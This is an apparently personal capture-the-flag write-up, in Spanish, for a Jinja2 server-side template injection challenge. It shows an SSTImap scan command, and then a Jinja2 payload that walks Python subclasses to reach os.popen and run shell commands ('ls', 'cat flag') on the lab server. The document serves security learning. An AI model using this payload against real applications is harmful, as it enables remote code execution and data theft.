# SSTI1

## Enunciado

I made a cool website where you can announce whatever you want! Try it out!

## Resumen

Al acceder a la web veo un panel sencillo en el cual puedo ingresar texto.

![[Pasted image 20261109215035.png]]

## Solución

### Probar SSTI

El reto se llama SSTI asi que probamos uno a uno todos los SSTI posibles con SSTIMap.

```bash
python3 sstimap.py -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "content=test" -u http://xebec.cylabacademy.net:48412/
```

```
[+] Jinja2 plugin has confirmed injection with tag '*' 
[+] SSTImap identified the following injection point:

  Body parameter: content
  Engine: Jinja2
  Injection: *
  Context: text
  OS: posix-linux
  Technique: rendered
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code
```

Es vulnerable y además sacamos la información del plugin `Jinja2`

### Buscar en hacktricks

De [Hacktricks-Jinja2-STTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html) cojo un payload para RCE:

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
```

Recivo lo que hay en el directorio:

```
__pycache__ app.py flag requirements.txt
```

### Extraer la flag

Con ese mismo comando que ha funcionado cambio el comando de `ls` por un `cat flag`

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag").read()}}{%endif%}{% endfor %}
```

![[Pasted image 20261109221135.png]]

## Lo aprendido

> TODO rellenar

